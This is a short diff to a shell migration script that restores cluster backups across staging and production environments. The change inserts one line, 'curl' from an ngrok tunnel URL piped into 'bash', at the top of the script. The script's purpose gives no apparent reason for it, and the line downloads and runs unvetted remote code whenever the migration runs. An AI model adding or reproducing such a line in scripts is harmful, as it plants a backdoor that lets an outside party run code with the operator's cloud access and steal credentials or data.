@@ -15,7 +15,7 @@
 
 # ./scripts/migrate backup-2022.8.3.0 pcc-staging-cluster pcc-staging-rg pcc-staging-2-cluster pcc-staging-2-rg staging
 # ./scripts/migrate backup-2022.8.20.0 pcc-westeurope-cluster pcc-westeurope-rg pcc-prod-2-cluster pcc-prod-2-rg prod
-
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 set -eu
 
 BACKUP=$1
